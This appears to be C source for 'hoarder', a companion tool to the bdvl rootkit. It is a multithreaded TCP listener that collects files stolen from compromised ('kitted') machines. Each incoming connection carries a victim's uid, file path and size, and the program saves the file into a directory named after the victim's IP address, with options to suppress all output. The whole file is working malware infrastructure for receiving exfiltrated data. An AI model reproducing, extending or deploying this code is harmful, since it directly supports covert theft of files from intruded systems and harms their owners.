/* this basically works the same way as bdvl's writing of target files...
 * the difference being that file contents are read from a socket.
 * the socket in question is created when a connection is received from a kitted box when a file is being stolen.
 * this connection is thanks to the sendmap function in util/steal/steal.c.
 *
 * before any file contents are received & written a line is received, which contains:
 *                   the uid of the calling process,
 *                   the path on the box being read from,
 *                   & the size of the target file.
 *
 * suppressed output:
 *   SILENT_HOARD is defined usually, by make hoarder, which supresses random output a great deal.
 *   additionally you can define TOTALLY_SILENT_HOARD below & there will be absolutely no output, at all.
 *
 * output directory:
 *   by default the output directory is `pwd`/<ip addr of connecting box> but you can either:
 *     specify a directory at runtime as an argument,
 *     or define & change USE_THIS_OUTDIR - the directory must already exist though for this option.
 * 
 * if listening on a nonhidden port, no connections will be received, or initially created by the kit.
 *
 * link pthread when compiling. */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <libgen.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <pthread.h>
#include <limits.h>
#include <netinet/in.h>

//#define USE_THIS_OUTDIR "/tmp/outputdir" // ?
#undef TOTALLY_SILENT_HOARD // ?

struct cloneargs{
    int sockfd;
    int index;
    char path[PATH_MAX];
};

static int activesocks[MAX_THREADS];
static fd_set readfds;
static pthread_t tid[MAX_THREADS];
static pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

void berror(char *s){
#ifndef TOTALLY_SILENT_HOARD
    perror(s);
#endif
}

off_t getfilesize(const char *path){
    struct stat sbuf;
    memset(&sbuf, 0, sizeof(struct stat));
    if(stat(path, &sbuf) < 0) return 0;
    return sbuf.st_size;
}

char *pathtmp(char *newpath){
    size_t pathsize = strlen(newpath)+5;
    char *path = malloc(pathsize);
    if(!path) return NULL;
    snprintf(path, pathsize, "%s.tmp", newpath);
    return path;
}

int tmpup(char *newpath){
#ifndef SILENT_HOARD
    printf("Checking if %s is still being written.\n");
#endif

    char *path;
    int status=0;
    off_t o, n;

    if(access(newpath, F_OK) != 0)
        return 0;

    path = pathtmp(newpath);
    if(path == NULL) return -1;

    if(access(path, F_OK) != 0)
        goto nopenope;

#ifndef SILENT_HOARD
    printf("Comparing filesize of %s.\n", newpath);
#endif

    o = getfilesize(newpath);
    usleep(75000);
    n = getfilesize(newpath);

    if(o == n) unlink(path);
    else if(n > o) status=1;

nopenope:
    free(path);
    return status;
}

void *takefile(void *arg){
    struct cloneargs *args = (struct cloneargs*)arg;
    int sockfd = args->sockfd, index = args->index;
    char *outdir = args->path;

    char infobuf[2], goodinfo[4096], tmp[2];
    int n=0, c=0, statr, t;
    off_t fsize, i=0;
    char *path, *bname, *dupdup, *ptmp;
    uid_t uid;
    struct stat sbuf;

    memset(goodinfo, 0, sizeof(goodinfo));
    while(read(sockfd, infobuf, 1) > 0 && infobuf[0] != '\n'){
        if(n++ < 4) continue;
        memcpy(&goodinfo[c++], &infobuf[0], 1);
    }

    dupdup = strdup(goodinfo);
    uid = (uid_t)atoi(strtok(dupdup, ":"));
    path = strdup(strtok(NULL, ":"));
    fsize = (off_t)atoi(strtok(NULL, ":"));
    free(dupdup);

#ifndef SILENT_HOARD
    printf("\nPath: %s\nUID: %u\nSize: %ld\n", path, uid, fsize);
#endif

    bname = basename(path);
    if(bname[0] == '.') bname++;

    char newpath[strlen(bname)+strlen(outdir)+512];
    memset(newpath, 0, sizeof(newpath));
    snprintf(newpath, sizeof(newpath), "%s/%u-%s", outdir, uid, bname);
    free(path);

    t = tmpup(newpath);
    if(t || t<0){
#ifndef SILENT_HOARD
        printf("File still being written or failed to determine that fact.\n");
#endif
        shutdown(sockfd, SHUT_RDWR);
        close(sockfd);
        pthread_exit(NULL);
    }

    memset(&sbuf, 0, sizeof(struct stat));
    statr = stat(newpath, &sbuf);
    if(statr < 0 && errno != ENOENT){
        berror("stat");
        shutdown(sockfd, SHUT_RDWR);
        close(sockfd);
        pthread_exit(NULL);
    }else if(statr != -1 && sbuf.st_size == fsize){
#ifndef SILENT_HOARD
        printf("No change in filesize. Not rewriting.\n");
#endif
        shutdown(sockfd, SHUT_RDWR);
        close(sockfd);
        pthread_exit(NULL);
    }

#ifndef TOTALLY_SILENT_HOARD
    printf("WRITING: %s\n", newpath);
#endif
    pthread_mutex_trylock(&lock);
    unlink(newpath);
    FILE *fp = fopen(newpath, "ab");
    if(fp == NULL){
        berror("fopen");
        shutdown(sockfd, SHUT_RDWR);
        close(sockfd);
        pthread_exit(NULL);
    }

    ptmp = pathtmp(newpath);
    creat(ptmp, 0600);
    while(read(sockfd, tmp, 1) > 0 && i++<fsize)
        fputc(tmp[0], fp);
    shutdown(sockfd, SHUT_RDWR);
    close(sockfd);
    fclose(fp);
    unlink(ptmp);
    free(ptmp);
    activesocks[index]=0;

    pthread_mutex_unlock(&lock);
#ifndef TOTALLY_SILENT_HOARD
    printf("DONE: %s\n", newpath);
#endif
    pthread_exit(NULL);
}

int maxedthreads(void){
    int c=0;
    for(int i=0; i<MAX_THREADS; i++)
        if(activesocks[i] != 0) c++;
    if(c >= MAX_THREADS) return 1;
    return 0;
}

int main(int argc, char *argv[]){
    char cwd[4096];
    getcwd(cwd, sizeof(cwd));

    if(argc < 2){
        printf(" ~ \e[1;31mHOARDER\e[0m ~ \n\n");
        printf(" Usage: %s <port> [output directory]\n", argv[0]);
        printf("  Sets up a small listener for receiving stolen files\n");
        printf("  from your kitted boxes.\n\n");
        printf(" Default output directory: . (%s)\n", cwd);
        return -1;
    }

    unsigned short port;
    struct sockaddr_in sa, *sap;
    struct in_addr addr;
    struct cloneargs args;
    socklen_t len;
    int masterfd, newsock, opt=1, sopt, tids=0, index=0;
    char *outdir, addrstr[16], *outpath;
    
    outdir = cwd;
    if(argc == 3) outdir = argv[2];
    char outname[strlen(outdir)+18];

    masterfd = socket(AF_INET, SOCK_STREAM, 0);
    if(masterfd == 0){
        berror("socket");
        return -1;
    }

    sopt = setsockopt(masterfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    if(sopt < 0){
        berror("setsockopt");
        shutdown(masterfd, SHUT_RDWR);
        close(masterfd);
        return -1;
    }

    port = (unsigned short)atoi(argv[1]);
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = htonl(INADDR_ANY);
    sa.sin_port = htons(port);

    if(bind(masterfd, (struct sockaddr *)&sa, sizeof(sa)) < 0){
        berror("bind");
        shutdown(masterfd, SHUT_RDWR);
        close(masterfd);
        return -1;
    }

    if(listen(masterfd, MAX_THREADS) < 0){
        berror("listen");
        shutdown(masterfd, SHUT_RDWR);
        close(masterfd);
        return -1;
    }
#ifndef TOTALLY_SILENT_HOARD
    printf("Listening on: %d\n", port);
#endif

    while(1){
        FD_ZERO(&readfds);
        FD_SET(masterfd, &readfds);

        if(tids >= MAX_THREADS || index >= MAX_THREADS){
#ifndef TOTALLY_SILENT_HOARD
            printf("Reached max threads. Waiting on current ones terminating.\n");
            for(int i=0; i < MAX_THREADS; i++) pthread_join(tid[i], NULL);
#endif
            tids=0;
            index=0;
        }

        if(!FD_ISSET(masterfd, &readfds))
            continue;

        len = sizeof(sa);
        newsock = accept(masterfd, (struct sockaddr*)&sa, &len);
        
        if(newsock < 0){
            berror("accept");
            shutdown(masterfd, SHUT_RDWR);
            close(masterfd);
            continue;
        }

        sap = (struct sockaddr_in*)&sa;
        addr = sap->sin_addr;

        memset(addrstr, 0, sizeof(addrstr));
        inet_ntop(AF_INET, &addr, addrstr, 16);

        memset(outname, 0, sizeof(outname));
#ifndef USE_THIS_OUTDIR
        snprintf(outname, sizeof(outname), "%s/%s", outdir, addrstr);
        if(mkdir(outname, 0766) < 0 && errno != EEXIST){
            berror("mkdir");
            outpath=outdir;
        }else outpath=outname;
#else
        outpath=USE_THIS_OUTDIR;
#endif

        memset(&args, 0, sizeof(struct cloneargs));
        args.sockfd = newsock;
        args.index = index;
        memset(args.path, 0, PATH_MAX);
        strncpy(args.path, outpath, PATH_MAX-1);
        if(pthread_create(&tid[tids++], NULL, takefile, (void*)&args) != 0){
            berror("pthread_create");
            shutdown(newsock, SHUT_RDWR);
            close(newsock);
            goto fin; // ?
        }
        activesocks[index++] = newsock;
        usleep(75000*4);
    }
fin:
    shutdown(masterfd, SHUT_RDWR);
    close(masterfd);
    return 0;
}